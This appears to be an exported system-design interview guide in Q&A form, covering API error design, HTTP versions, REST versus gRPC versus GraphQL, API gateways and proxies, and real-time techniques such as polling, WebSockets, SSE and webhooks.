questions.question: Your API returns a 500 error. The client has no idea what went wrong. How do you design error responses so developers can actually debug?
questions.tldr: Return structured error objects with a machine-readable code, a human-readable message, and enough context to fix the problem — but never leak internals.
questions.answer: A bare 500 Internal Server Error is useless. Good APIs return structured errors that help the developer fix the problem without contacting support.
points: Use the right HTTP status — 400 (bad request/validation), 401 (not authenticated), 403 (not authorized), 404 (not found), 409 (conflict), 422 (unprocessable), 429 (rate limited), 500 (server error). Never return 200 with an error in the body.
Structured error body — { "error": { "code": "INVALID_CARD", "message": "The card number is invalid", "param": "card_number", "doc_url": "https://docs.api.com/errors/INVALID_CARD" }}
Machine-readable codes — Use constants like RATE_LIMITED, INVALID_ARGUMENT, RESOURCE_NOT_FOUND. Clients switch on these codes. Human messages change; codes don't.
Never leak internals — Don't return stack traces, SQL queries, or internal service names in production errors. Log them server-side; return a generic message to the client.

Stripe's error model — Every Stripe error includes type (card_error, api_error, etc.), code (card_declined), message, and param (which field caused it). Developers can programmatically handle each case.

questions.question: Walk me through exactly what happens when I type a URL in the browser and hit Enter — every network layer.
questions.tldr: DNS resolution, TCP handshake, TLS handshake, HTTP request, server processing, response, and rendering. Understanding this flow is foundational.
questions.answer: This is the most classic interview question in networking. Every system design decision (CDN, load balancer, cache) maps to a specific step in this flow.
questions.diagram:
sequenceDiagram
  participant B as Browser
  participant DNS as DNS Resolver
  participant S as Server
  B->>DNS: What IP is api.uber.com?
  DNS-->>B: 104.18.12.33
  B->>S: TCP SYN (3-way handshake)
  S-->>B: SYN-ACK
  B->>S: ACK + TLS ClientHello
  S-->>B: TLS ServerHello + Cert
  B->>S: GET /rides HTTP/1.1
  S-->>B: 200 OK + JSON payload
questions.diagramCaption: Simplified request lifecycle — DNS, TCP, TLS, then HTTP
points: 1. DNS lookup — Browser checks cache → OS cache → router → ISP DNS → recursive resolver → authoritative nameserver. This can add 20-120ms. CDNs reduce this with edge PoPs.
2. TCP handshake — SYN, SYN-ACK, ACK. Three round trips to establish connection. HTTP/2 and HTTP/3 (QUIC) reduce this overhead.
3. TLS handshake — Certificate exchange, key negotiation. Adds another 1-2 round trips. TLS 1.3 does this in one round trip.
4. HTTP request — Method, path, headers (Host, Accept, Auth), optional body. The server routes this through reverse proxy → load balancer → API gateway → application → database.
5. Response — Status code + headers (Content-Type, Cache-Control, Set-Cookie) + body. The browser parses and renders.
Interview mapping — DNS → GeoDNS/multi-DC. TCP → connection pooling. TLS → SSL termination at LB. HTTP → REST/gRPC design. Response → caching headers, CDN.

questions.question: What's the difference between HTTP/1.1, HTTP/2, and HTTP/3? Should I care for system design?
questions.tldr: HTTP/2 multiplexes requests over one connection (huge perf win). HTTP/3 uses QUIC (UDP-based) for faster handshakes and no head-of-line blocking.
questions.answer: Yes, you should care. The protocol version affects latency, connection management, and how you design your API communication patterns.

rows: One request per connection (pipelining rarely works)

points: HTTP/2 is the practical default — Most CDNs, load balancers, and browsers use it. The multiplexing means your API can send 100 responses over one connection instead of opening 100 connections.
HTTP/3 matters for mobile — QUIC handles network switching (WiFi → cellular) without dropping connections. This is why Google built it — mobile users change networks constantly.
gRPC requires HTTP/2 — This is why gRPC has native streaming and multiplexing. If your infrastructure doesn't support HTTP/2, gRPC won't work.

System design impact — With HTTP/1.1, clients open 6+ parallel connections to one server (browser limit). With HTTP/2, one connection handles all requests. This reduces server resource usage dramatically.

questions.question: Give me a real-world API design you admire, and tell me what they got right that most APIs get wrong.
questions.tldr: Stripe's API is the gold standard — predictable patterns, prefixed IDs, expandable objects, idempotency keys, and date-based versioning.
questions.answer: Stripe is universally cited as the best-designed API. Here's what they get right that most APIs mess up:
points: Prefixed IDs — ch_3MqZ... (charge), cus_Nffr... (customer), pi_1Dsr... (payment intent). You can tell what an object is just by looking at its ID. Compare that to a UUID like 550e8400-e29b... — which could be anything.
Expandable objects — GET /invoices/inv_1?expand[]=customer embeds the full customer object instead of just the ID. Eliminates extra round trips. The client controls the payload shape.

Consistent patterns — Every resource follows the same CRUD pattern. POST /customers, GET /customers/:id, POST /customers/:id (update), DELETE /customers/:id. Once you learn one resource, you know them all.
Automatic retries with idempotency — Every mutating endpoint accepts an Idempotency-Key header. Client libraries auto-retry with exponential backoff. Network failures are transparent.
Why this matters in interviews — When asked to "design an API," citing Stripe's patterns shows you've studied real production APIs, not just textbook definitions.

takeaways: Resources, not actions — REST URLs are nouns (/rides), HTTP methods are verbs (GET, POST, PUT, DELETE)
Idempotency keys — Client-generated UUID sent with POST requests to prevent duplicate creates on retry
Cursor pagination — Use ?after=cursor for large datasets; offset pagination is O(n) and breaks at scale
Version your API — URL versioning (/v1/) for public, header versioning for internal services
Structured errors — Machine-readable code + human message + param that caused it. Never 200-with-error.
HTTP/2 — Multiplexed streams, header compression, required by gRPC. The modern default.
Stripe is the gold standard — Prefixed IDs, expandable objects, idempotency, date-versioning

chapters.title: gRPC, GraphQL, and When to Use What
chapters.subtitle: REST vs gRPC vs GraphQL — protocol buffers, schema-first design, streaming, and when each shines in production.

questions.question: You're designing the communication between 20 internal microservices. Would you still use REST?
questions.tldr: Probably not. gRPC with Protocol Buffers is better for internal service-to-service communication — it's faster, type-safe, and supports streaming.
questions.answer: REST is great for public APIs where every developer knows HTTP. But internally, between services you control, you're paying for REST's overhead with no benefit. gRPC is the default choice for internal microservice communication.
points: Protocol Buffers — You define your API as a .proto file. protoc generates client and server code in any language. Both sides have compile-time type safety. If you change the schema incompatibly, the build breaks — not production.
HTTP/2 is mandatory for gRPC — This gives you multiplexing (100 concurrent RPCs on one connection), header compression, and streaming for free.
Real-world use — Google uses gRPC for virtually all internal services. Netflix moved from REST to gRPC for inter-service calls and saw latency drop 50% and bandwidth drop 70%.
Trade-off — gRPC is harder to debug (binary payloads), requires HTTP/2 infrastructure, and doesn't work natively in browsers. For public APIs, REST is still king.
questions.followup:
"Can you show me what a .proto file looks like?"

service RideService { rpc CreateRide(CreateRideRequest) returns (Ride); rpc StreamDriverLocation(RideId) returns (stream Location); } — The stream keyword means the server continuously pushes driver location updates. This is native in gRPC but would require WebSockets or SSE in REST.

questions.question: Your mobile app shows a user profile with their name, avatar, last 5 orders, and the delivery status of each. That's 3 REST endpoints. Can you do better?
questions.tldr: GraphQL lets the client request exactly the fields it needs from multiple resources in a single query — solving REST's over-fetching and under-fetching problems.
questions.answer: This is the classic problem GraphQL was built to solve. With REST, you'd call GET /users/42, GET /users/42/orders?limit=5, and GET /orders/:id/delivery for each order — that's 7 HTTP round trips for one screen. On a 3G mobile connection, that's seconds of latency.
questions.diagram:
graph LR subgraph REST: 7 round trips R1[GET /users/42] R2[GET /users/42/orders] R3[GET /orders/1/delivery] R4[GET /orders/2/delivery] end subgraph GraphQL: 1 round trip G1["POST /graphql
query { user(id:42)
{ name, orders { status } } }"] end style G1 fill:#30d158,color:#000 style R1 fill:#ff453a,color:#fff style R2 fill:#ff453a,color:#fff style R3 fill:#ff453a,color:#fff style R4 fill:#ff453a,color:#fff
questions.diagramCaption: REST requires multiple round trips; GraphQL fetches everything in one
points: Over-fetching solved — REST's GET /users/42 returns ALL 30 fields. The mobile app needs 3. GraphQL lets the client specify: { user(id: 42) { name, avatar } }. Less bandwidth, faster loads.
Under-fetching solved — One GraphQL query traverses relationships: user → orders → delivery status. No waterfall of sequential REST calls.
Schema is the contract — GraphQL uses SDL (Schema Definition Language) to define types. The schema IS the documentation. Frontend teams know exactly what's available.
Real-world users — Facebook (invented it), Shopify (entire storefront API), GitHub (v4 API), Airbnb (mobile app).

questions.question: GraphQL sounds perfect. Why doesn't everyone use it? What are the downsides?
questions.tldr: Caching is harder, query complexity can explode, N+1 problems are easy to create, and the single endpoint makes monitoring difficult.
questions.answer: GraphQL solves real problems, but it introduces new ones. Most teams that adopt GraphQL underestimate the operational complexity.
points: Caching is painful — REST: GET /users/42 → CDN caches by URL. Done. GraphQL: every request is POST /graphql with a different body. CDN caching doesn't work. You need application-level caching (DataLoader, persisted queries) which is more complex.

Query complexity attacks — A malicious client can send: { user { friends { friends { friends { friends } } } } } — an exponentially expensive query. You must implement depth limiting, cost analysis, and query allowlisting.

N+1 problem — Query { users { orders { items } } } naively fetches each user's orders one at a time (N queries). Fix: use DataLoader to batch database queries. But this is extra infrastructure every resolver needs.

Monitoring is harder — With REST, you see GET /users 500ms in your dashboard. With GraphQL, everything is POST /graphql 500ms. You need custom instrumentation to trace which fields caused the latency.

Error handling is messy — GraphQL returns 200 even when parts of the query fail. Partial success/failure is possible: some fields resolve, others error. Clients must check both data and errors in every response.
questions.followup:
"OK, so when would you NOT use GraphQL?"

Don't use GraphQL when: (1) Your API is simple CRUD with few relationships — REST is simpler. (2) You need aggressive HTTP caching — REST's URL-based caching is unbeatable. (3) You're building server-to-server APIs — gRPC is faster and type-safer. (4) Your team is small and doesn't have GraphQL expertise — the operational overhead isn't worth it for 5 endpoints.

questions.question: Let me put it directly — I'm building a new system. REST, gRPC, or GraphQL. Give me a decision framework.
questions.tldr: REST for public/simple APIs, gRPC for internal services, GraphQL for complex client-driven UIs. Most production systems use 2-3 of them together.
questions.answer: This is not a religious debate. Each protocol solves a specific problem. The right answer is almost always: use different protocols for different parts of the system.
questions.diagram:
graph TD Q1{Who is the consumer?} Q1 -->|Public developers| REST["REST
Universal, cacheable"] Q1 -->|Internal services| gRPC["gRPC
Fast, type-safe"] Q1 -->|Mobile/web app| Q2{Data shape complex?} Q2 -->|Simple CRUD| REST2["REST
Simpler to build"] Q2 -->|Nested, varies by screen| GQL["GraphQL
Client-driven queries"] style REST fill:#30d158,color:#000 style gRPC fill:#bf5af2,color:#fff style REST2 fill:#30d158,color:#000 style GQL fill:#ff9f0a,color:#000
questions.diagramCaption: Decision tree — consumer type and data complexity drive the choice

rows: Stripe, Twilio, GitHub v3 — universally understood, cacheable, documented
Google, Netflix, Uber — binary protocol, streaming, code-gen, 10x faster
Facebook, Shopify, Airbnb — one query per screen, client controls shape
Uber driver tracking — server pushes location every 4 seconds
Admin dashboards — team knows REST, 10 endpoints, no complexity needed
Netflix — Gateway aggregates gRPC services, exposes GraphQL to mobile

points: Netflix's hybrid architecture — Mobile apps talk GraphQL to a BFF (Backend for Frontend) gateway. The gateway talks gRPC to internal microservices. Public partner API is REST. Three protocols, each used where it's strongest.
Uber's stack — gRPC for 4,000+ microservices internally. REST for public API (developer platform). Server streaming for real-time driver location.
Shopify — GraphQL for storefront API (complex product queries), REST for admin API (simple CRUD).

questions.question: You mentioned Protocol Buffers. How are they different from JSON, and why does the format matter for performance?
questions.tldr: Protobuf is binary, 2-10x smaller than JSON, and 5-100x faster to serialize. The trade-off is human readability.
questions.answer: JSON is text-based: {"name":"Alice","age":30} — the field names repeat in every message. Protocol Buffers assign field numbers instead and encode values as binary. The result is dramatically smaller and faster.
points: Why size matters at scale — A microservice making 100K RPCs/second saves 5-7 GB/hour by switching from JSON to Protobuf. At Google's scale (billions of RPCs/day), this translates to petabytes of saved bandwidth.
Schema evolution — Add new fields by adding new field numbers. Old clients ignore unknown fields. Remove fields by reserving the number. This is safer than JSON where any client can send anything.
Not just for gRPC — Protobuf can be used with REST or Kafka. LinkedIn uses Protobuf over HTTP for their APIs. Apache Kafka uses Avro (similar concept) for event schemas.

questions.question: I've heard about tRPC. Is it a replacement for all of these?
questions.tldr: tRPC is TypeScript-specific — it shares types between client and server with zero code generation. Great for full-stack TypeScript apps, but not a general-purpose protocol.
questions.answer: tRPC is not a protocol like REST, gRPC, or GraphQL. It's a TypeScript library that uses the language's type system to share types between frontend and backend — no schema files, no code generation, no runtime overhead.
points: How it works — You define a function on the server. The client imports the type directly. TypeScript ensures the request and response types match at compile time. Change a return type → the client gets a red squiggly instantly.

When to use — Full-stack TypeScript monorepo (Next.js, Remix). Both client and server in the same codebase. Small to medium teams. If your stack is 100% TypeScript, tRPC is the fastest path to type-safe APIs.

When NOT to use — Multi-language services (Python backend, React frontend). Public APIs (external devs don't import your types). Microservices in different languages. At that point, gRPC or REST is better.
Real-world — Popular in the T3 stack (Next.js + tRPC + Prisma + Tailwind). Used by startups and internal tools. Not used at FAANG scale (they're multi-language).

takeaways: REST — Public APIs, simple CRUD, HTTP caching. Universal but verbose.
gRPC — Internal services, streaming, high performance. Binary, type-safe, but not browser-native.
GraphQL — Complex client-driven UIs, mobile apps. Flexible but caching/monitoring is harder.
tRPC — Full-stack TypeScript only. Zero-config type safety but locked to one language.
Protobuf vs JSON — 2-10x smaller, 5-100x faster to parse. Trade-off: not human readable.
Most systems use 2-3 protocols — gRPC internally, REST publicly, GraphQL for mobile BFF.
Netflix pattern — GraphQL gateway (mobile) → gRPC (services) → REST (public partners)

chapters.title: API Gateways, Proxies, and Reverse Proxies
chapters.subtitle: What sits between clients and services — authentication, rate limiting, routing, SSL termination, and the difference between forward proxy, reverse proxy, and API gateway.

questions.question: A request goes from a user's phone to your backend. What sits in between, and in what order?
questions.tldr: CDN → Load Balancer → API Gateway → Application Server → Database. Each layer solves a different problem — don't conflate them.
questions.answer: In a production system, a request passes through multiple layers before reaching your code. Candidates often confuse these layers or think they're the same thing. They're not.
questions.diagram:
graph LR C[Client] --> CDN[CDN
Static cache] CDN --> LB[Load Balancer
Distribute traffic] LB --> GW[API Gateway
Auth, rate limit] GW --> App[App Server
Business logic] App --> DB[(Database)] style CDN fill:#ff9f0a,color:#000 style LB fill:#30d158,color:#000 style GW fill:#bf5af2,color:#fff style App fill:#0a84ff,color:#fff
questions.diagramCaption: Request flow through production infrastructure layers

rows: Cache static content close to user

points: They overlap in practice — NGINX can act as reverse proxy, load balancer, AND basic gateway simultaneously. AWS ALB is an L7 load balancer with some gateway features. In interviews, show you understand the conceptual separation even when one tool does multiple jobs.
Not every system needs all layers — A startup might use NGINX as reverse proxy + load balancer. A FAANG system has dedicated tools at each layer. Design for your scale.

questions.question: Wait — what's the actual difference between a forward proxy and a reverse proxy? I always mix them up.
questions.tldr: Forward proxy sits in front of clients (hides the client). Reverse proxy sits in front of servers (hides the server). Think: who is being protected?
questions.answer: The naming is confusing because both are "proxies." The difference is which side they protect:
questions.diagram:
graph LR
  subgraph Forward Proxy
    C1[Client A] --> FP[Proxy]
    C2[Client B] --> FP
    FP --> S1[Internet / Server]
  end
  subgraph Reverse Proxy
    C3[Internet / Client] --> RP[Proxy]
    RP --> S2[Server A]
    RP --> S3[Server B]
  end
  style FP fill:#ff9f0a,color:#000
  style RP fill:#bf5af2,color:#fff
questions.diagramCaption: Forward proxy hides clients; reverse proxy hides servers

rows: Corporate firewalls, content filtering, VPNs, bypassing geo-blocks
SSL termination, load balancing, caching, DDoS protection

points: Simple memory trick — Forward proxy: client says "go fetch this for me" (hides client). Reverse proxy: server says "I'll receive this for my backends" (hides server).
VPN is a forward proxy — Your traffic goes through the VPN server, so the destination sees the VPN's IP, not yours.
Cloudflare is a reverse proxy — When you put your site behind Cloudflare, attackers see Cloudflare's IP, not your server's. Your origin server is hidden.

questions.question: OK, so where does an API gateway fit? Isn't it just a reverse proxy with extra features?
questions.tldr: Yes, essentially. An API gateway IS a reverse proxy with API-specific features added: authentication, rate limiting, request transformation, and routing to microservices.
questions.answer: This is the right mental model. A reverse proxy handles infrastructure concerns (SSL, caching, compression). An API gateway handles API-level concerns (auth, rate limiting, versioning, routing). An API gateway is a reverse proxy that speaks "API."

rows: Adapt requests between client and service

points: Centralized cross-cutting concerns — Without a gateway, every microservice implements its own auth, rate limiting, and logging. With a gateway, you do it once. This is the #1 reason to use an API gateway — DRY for infrastructure.
Real-world stacks — Netflix uses Zuul/Spring Cloud Gateway. Amazon uses their own API Gateway. Uber uses Envoy. Kong is the most popular open-source option (built on NGINX + Lua).

Trade-off — The gateway is a single point of failure. If it goes down, ALL API traffic stops. Mitigation: deploy multiple instances behind a load balancer, use health checks, and keep the gateway stateless so any instance can handle any request.
questions.followup:
"If the gateway is a single point of failure, why not just put auth in each service?"

Two reasons: (1) Consistency — one auth bug in one service means a security hole. Centralized auth means one implementation, one audit. (2) Performance — the gateway can reject 90% of bad requests (invalid tokens, rate-limited) before they touch your services. The gateway is a bouncer — it's cheaper to reject at the door than inside the club.

questions.question: You have 50 microservices. How does the API gateway route requests to the right one?
questions.tldr: Path-based routing maps URL prefixes to services. The gateway acts as a single entry point that fans out to the correct backend based on the request path.
questions.answer: The gateway inspects the request (usually the URL path) and routes it to the appropriate microservice. This is the primary pattern for microservice architectures.
questions.diagram:
graph LR
  C[Client] --> GW[API Gateway]
  GW -->|"/users/*"| US[User Service]
  GW -->|"/orders/*"| OS[Order Service]
  GW -->|"/payments/*"| PS[Payment Service]
  GW -->|"/search/*"| SS[Search Service]
  style GW fill:#bf5af2,color:#fff
  style US fill:#30d158,color:#000
  style OS fill:#30d158,color:#000
  style PS fill:#30d158,color:#000
  style SS fill:#30d158,color:#000
questions.diagramCaption: Path-based routing — the gateway fans out by URL prefix

rows: Most common. Clean URL structure, easy to understand.
Canary deployments — test new versions with small traffic.
JSON body inspection routes to handler
Complex routing (GraphQL, SOAP). Higher latency — must parse body.

points: Service discovery integration — Services register themselves (Consul, Eureka, Kubernetes DNS). The gateway looks up the healthy instances dynamically. No hardcoded IPs.
Canary deployments — Route 5% of traffic to the new version. Monitor error rates. If healthy, increase to 25%, 50%, 100%. This is how Netflix, Google, and Amazon deploy without downtime.

BFF pattern (Backend for Frontend) — Instead of one gateway, create separate gateways per client type: mobile BFF, web BFF, partner BFF. Each aggregates and transforms data differently for its consumer. Netflix's "Falcor" and Apollo Federation follow this pattern.

questions.question: What's a service mesh and how is it different from an API gateway? I keep hearing about Istio.
questions.tldr: API gateway handles north-south traffic (client to services). Service mesh handles east-west traffic (service to service). Different layers, complementary.
questions.answer: In microservice architectures, there are two traffic patterns: north-south (external client → your services) and east-west (service A → service B internally). They need different solutions.
questions.diagram:
graph TD
  subgraph North-South
    Client[External Client]
    Client --> GW[API Gateway]
  end
  subgraph East-West via Service Mesh
    GW --> A[Service A + Sidecar]
    A <--> B[Service B + Sidecar]
    A <--> C[Service C + Sidecar]
    B <--> C
  end
  style GW fill:#bf5af2,color:#fff
  style A fill:#30d158,color:#000
  style B fill:#30d158,color:#000
  style C fill:#30d158,color:#000
questions.diagramCaption: Gateway handles external traffic; mesh handles internal service-to-service
points: Sidecar pattern — In a mesh, every service gets a proxy sidecar (usually Envoy) deployed alongside it. All outgoing/incoming traffic goes through the sidecar. The application doesn't know the mesh exists — it just calls http://order-service:8080 and the sidecar handles mTLS, retries, circuit breaking, and tracing.

mTLS everywhere — In a service mesh, every service-to-service call is encrypted and authenticated. No service can impersonate another. This is how you get zero-trust networking without changing application code.

When to use a mesh — When you have 20+ microservices and need consistent observability, security, and traffic management without baking it into each service. If you have 5 services, a mesh is overkill.

Complexity tax — Istio adds significant operational complexity: control plane, sidecar injection, CRDs, debugging proxy issues. Teams under 50 engineers rarely need a service mesh. Start with direct calls + a shared HTTP client library.
questions.followup:
"Can you use both an API gateway and a service mesh?"

Yes, and this is the standard architecture at scale. The API gateway handles external concerns (auth, rate limiting, public routing). The service mesh handles internal concerns (mTLS, circuit breaking, retries). They operate at different layers and complement each other. Uber, Lyft, and Google all use both.

questions.question: You mentioned SSL termination earlier. What is it, why does the proxy handle it, and isn't that a security risk?
questions.tldr: SSL termination decrypts HTTPS at the proxy layer so backend servers handle plain HTTP. It offloads CPU-intensive encryption and centralizes certificate management.
questions.answer: Every HTTPS request requires encryption and decryption — which is CPU-intensive. SSL termination means the reverse proxy/load balancer handles the TLS handshake and decryption, then forwards plain HTTP to backend servers.
questions.diagram:
sequenceDiagram
  participant Client
  participant LB as LB / Reverse Proxy
  participant App as App Server
  Client->>LB: HTTPS (encrypted)
  Note over LB: Decrypt TLS here
  LB->>App: HTTP (plain, internal)
  App-->>LB: HTTP response
  LB-->>Client: HTTPS (re-encrypt)
questions.diagramCaption: SSL termination — encrypted externally, plain HTTP internally
points: Why terminate at the proxy — (1) TLS handshakes are CPU-heavy. One proxy does it instead of 50 app servers. (2) Certificate management in one place — renew once, not on every server. (3) The proxy can inspect and route HTTP headers that are invisible when encrypted.

"Isn't internal plain HTTP insecure?" — Yes, if your internal network is untrusted. In a VPC/private network, it's acceptable. For zero-trust environments, use mTLS end-to-end (what service meshes provide) or re-encrypt at the proxy (SSL bridging).

SSL passthrough — The alternative: the proxy forwards encrypted traffic directly to the backend without decrypting. The backend handles TLS itself. Used when the proxy shouldn't see the payload (e.g., financial data). Trade-off: proxy can't route by HTTP path or inspect headers.
Real-world — AWS ALB terminates SSL by default. Cloudflare terminates at their edge. NGINX is commonly configured for SSL termination in front of Node.js or Python servers that handle plain HTTP.

questions.question: If the API gateway goes down, everything goes down. How do you make it not a single point of failure?
questions.tldr: Deploy multiple gateway instances behind a load balancer with health checks. Keep the gateway stateless so any instance handles any request.
questions.answer: The gateway is infrastructure — it must be more reliable than the services behind it. Here's the standard approach:
points: Multiple instances — Run 3+ gateway instances across availability zones. A load balancer (NLB or DNS round-robin) distributes traffic. If one dies, health checks remove it from rotation.

Stateless gateway — The gateway must store nothing locally — no sessions, no cache state, no sticky anything. Auth tokens are validated against an external service (or verified via JWT signature locally). Rate limit counters live in Redis, not in gateway memory. Any instance can serve any request.
Circuit breakers — If a backend service is down, the gateway should fail fast (503) instead of hanging. Implement circuit breakers (Hystrix, resilience4j) to avoid cascading failures.

Graceful degradation — If the auth service is slow, the gateway can serve cached auth decisions briefly. If rate limiting Redis is down, default to allowing traffic (fail open for availability) or blocking (fail closed for security) depending on your SLA.

Real-world — Netflix runs hundreds of Zuul gateway instances behind AWS NLB. Kong deploys as a Kubernetes DaemonSet or Deployment with horizontal pod autoscaling. The gateway should be the most boring, over-provisioned part of your infrastructure.

takeaways: Request flow — Client → CDN → Load Balancer → API Gateway → App Server → Database
Forward proxy — Hides clients (VPN, corporate firewall). Reverse proxy — hides servers (NGINX, Cloudflare).
API Gateway = reverse proxy + API concerns — Auth, rate limiting, routing, transforms. Centralizes cross-cutting concerns.
North-south vs east-west — Gateway for external traffic. Service mesh for internal service-to-service.
SSL termination — Decrypt at proxy, plain HTTP internally. Use mTLS for zero-trust.
Stateless gateway — No local state. Multiple instances behind LB. Health checks. Circuit breakers.
BFF pattern — Separate gateways per client type (mobile, web, partner) for tailored aggregation.

chapters.title: Webhooks, Long Polling, and WebSockets
chapters.subtitle: Push vs pull — when to use HTTP polling, long polling, SSE, or WebSockets, and how Discord, Slack, and Uber handle real-time at scale.

questions.question: Your user places an order and wants to see the delivery status update in real-time. How do you push updates to the client?
questions.tldr: You have four options: short polling, long polling, SSE, or WebSockets. The choice depends on whether the client needs to send data back and how real-time you need to be.
questions.answer: HTTP was designed as request-response: the client asks, the server answers. But what if the server has new data and the client didn't ask? That's the real-time problem. There are four solutions, each with different trade-offs.

rows: Client asks "any updates?" every N seconds
Client asks, server holds until data arrives
Server pushes events over persistent HTTP

questions.diagram:
sequenceDiagram
  participant C as Client
  participant S as Server
  Note over C,S: Short Polling
  C->>S: Any updates? (every 5s)
  S-->>C: No
  C->>S: Any updates?
  S-->>C: No
  C->>S: Any updates?
  S-->>C: Yes! Order shipped
questions.diagramCaption: Short polling — most requests return empty, wasting bandwidth
points: Short polling — Simple but wasteful. If you poll every 5 seconds and updates happen every 30 minutes, 99% of requests return nothing. Only use for non-critical, low-frequency updates (dashboard refresh, job status every 30s).
The core question — Does the client need to send data back to the server in real-time? If yes → WebSocket. If only server → client → SSE. If neither is available → long polling.

questions.question: OK, explain long polling. Twitter used it for years. How does it actually work under the hood?
questions.tldr: The client sends a request, the server holds it open until new data is available (or timeout), responds, and the client immediately reconnects. Simulates push over HTTP.
questions.answer: Long polling is the clever hack that powered real-time web before WebSockets existed. Twitter's notification system, early Facebook chat, and many notification systems used it.
questions.diagram:
sequenceDiagram
  participant C as Client
  participant S as Server
  C->>S: GET /updates (blocks)
  Note over S: Holds connection open...
  Note over S: 25 seconds pass...
  S-->>C: New data arrived!
  C->>S: GET /updates (reconnects)
  Note over S: Holds again...
questions.diagramCaption: Long polling — server holds the connection until data is ready
points: How it works step by step — (1) Client sends HTTP request. (2) Server checks for new data. If none, it holds the connection open (doesn't respond). (3) When data arrives OR timeout (30-60s), server responds. (4) Client immediately sends a new request. The cycle repeats.
Better than short polling because — No wasted requests. The server only responds when there's actual data. Latency is near-instant once data arrives.

Problems at scale — Each waiting client holds an open HTTP connection on the server. 10K online users = 10K idle connections consuming server threads. Traditional thread-per-connection servers (Apache) struggle. Async servers (Node.js, Go, NGINX) handle this better.

When to use today — When WebSockets are blocked by corporate proxies or firewalls. As a fallback mechanism. For "bursty" events like job completion notifications where you don't need sub-100ms latency.
questions.followup:
"If long polling holds connections, how is it different from WebSockets?"

Long polling uses standard HTTP — each update requires a full HTTP request/response cycle (new headers, cookies, etc.). WebSockets upgrade once, then send raw frames with minimal overhead (~2 bytes per frame vs ~800 bytes per HTTP request). At 1000 messages/second, the overhead difference is massive.

questions.question: Let's say you're building Discord. Millions of users chatting in real-time. WebSockets?
questions.tldr: Yes. WebSockets provide bidirectional, low-latency communication over a persistent TCP connection. Discord, Slack, and all chat apps use them.
questions.answer: When you need bidirectional real-time communication — where both client and server send data at any time — WebSockets are the only practical choice.
questions.diagram:
sequenceDiagram
  participant C as Client
  participant S as Server
  C->>S: HTTP Upgrade: websocket
  S-->>C: 101 Switching Protocols
  Note over C,S: Persistent TCP connection
  C->>S: Send message (2-byte frame)
  S-->>C: New message from Bob
  S-->>C: Alice is typing...
  C->>S: Read receipt
  S-->>C: Bob went offline
questions.diagramCaption: WebSocket — one handshake, then bidirectional frames
points: How it works — Starts as HTTP, then "upgrades" to WebSocket protocol via Upgrade: websocket header. After the handshake, both sides send data frames freely. No more HTTP overhead.

Why chat needs it — Chat requires: sending messages (client → server), receiving messages (server → client), typing indicators (both ways), presence updates (both ways), read receipts (both ways). Only WebSockets handle all of these on one connection.

Discord's numbers — Discord handles millions of concurrent WebSocket connections. Each "gateway" server manages ~50K connections. They use erlang/elixir for the WebSocket layer because of its lightweight process model.

Connection management at scale — Each WebSocket is a long-lived TCP connection. 1M users = 1M connections. You need: (1) connection-per-server limits, (2) graceful reconnection on failure, (3) heartbeat/ping-pong to detect dead connections, (4) load balancing that is WebSocket-aware (sticky sessions or connection ID routing).
questions.followup:
"How do you load balance WebSocket connections? Normal round-robin won't work, right?"

Correct. Once a WebSocket is established, all messages must go to the same server. Options: (1) Sticky sessions — LB routes the initial HTTP upgrade to a server and pins all future traffic there. (2) Connection-aware routing — Use a connection registry (Redis) that maps connection_id → server. When another service needs to push to user X, it looks up which server holds their WebSocket. This is how Discord and Slack route messages — through a pub/sub layer (Redis, Kafka) that broadcasts to the right gateway server.

questions.question: ChatGPT streams its response word by word. That's not WebSocket — what is it?
questions.tldr: Server-Sent Events (SSE) — a one-way HTTP stream where the server pushes data to the client. Perfect when only the server needs to push.
questions.answer: SSE is the underrated middle ground between polling and WebSockets. It's a persistent HTTP connection where the server sends events, but the client can only listen (not send data on the same connection).
questions.diagram:
sequenceDiagram
  participant C as Client
  participant S as Server
  C->>S: GET /stream (Accept: text/event-stream)
  S-->>C: data: token "The"
  S-->>C: data: token "weather"
  S-->>C: data: token "is"
  S-->>C: data: token "sunny"
  S-->>C: event: done
questions.diagramCaption: SSE — server streams events over a single HTTP connection
points: How it works — Client opens a GET request with Accept: text/event-stream. Server keeps the connection open and writes events in a simple text format: data: {payload}\n\n. The browser's EventSource API handles it natively — no library needed.

Built-in auto-reconnect — Unlike WebSockets, if the connection drops, the browser automatically reconnects and sends the last event ID. The server can resume from where it left off. SSE has reconnection built into the spec. WebSockets do not.

When to choose SSE over WebSocket — (1) Server-only push: stock tickers, live scores, AI streaming responses. (2) You need HTTP caching/CDN compatibility. (3) You want simpler infrastructure (regular HTTP servers, no upgrade needed).
Real-world users — ChatGPT (streaming tokens), GitHub (live build logs), Vercel (deployment progress), Facebook (notification streams for mobile web).
Limitations — Unidirectional only. Limited to 6 connections per domain in HTTP/1.1 (fine in HTTP/2). Text-only (no binary). If you need bidirectional, use WebSockets.

questions.question: You're integrating with Stripe to process payments. Stripe needs to tell your server when a payment succeeds. How does that work?
questions.tldr: Webhooks — Stripe sends an HTTP POST to your server when an event occurs. It's server-to-server push notification using regular HTTP callbacks.
questions.answer: Webhooks are the server-to-server equivalent of real-time push. Instead of your server polling Stripe every second asking "did the payment go through?", Stripe POSTs to your URL when something happens.
questions.diagram:
sequenceDiagram
  participant Y as Your Server
  participant S as Stripe
  Y->>S: POST /charges (create payment)
  S-->>Y: 200 OK (pending)
  Note over S: Payment processes...
  S->>Y: POST /webhooks/stripe
  Note over Y: {type: "charge.succeeded"}
  Y-->>S: 200 OK (acknowledged)
questions.diagramCaption: Webhook — Stripe calls YOUR server when the event happens
points: How webhooks work — (1) You register a URL with the provider: https://yourapp.com/webhooks/stripe. (2) When an event occurs (payment, refund, dispute), the provider POSTs a JSON payload to your URL. (3) You return 200 to acknowledge. If you return non-200, they retry with exponential backoff.

Security — signature verification — Always verify the webhook signature. Stripe signs every webhook with a secret. You compute HMAC-SHA256 on the payload and compare. Without this, an attacker could POST fake events to your endpoint.
Idempotency — handle duplicates — Providers retry on failures, so you'll receive the same event multiple times. Store the event ID and skip if already processed. Process webhooks idempotently.

Reliability — don't process inline — Your webhook handler should: (1) Verify signature. (2) Save the event to a queue or database. (3) Return 200 immediately. (4) Process asynchronously. If your handler takes 30 seconds, the provider will timeout and retry — causing duplicates.
Real-world webhook users — Stripe (payments), GitHub (push events, CI triggers), Twilio (SMS delivery), Shopify (order events), Slack (bot events).
questions.followup:
"What if your webhook endpoint is down? Do you lose events?"

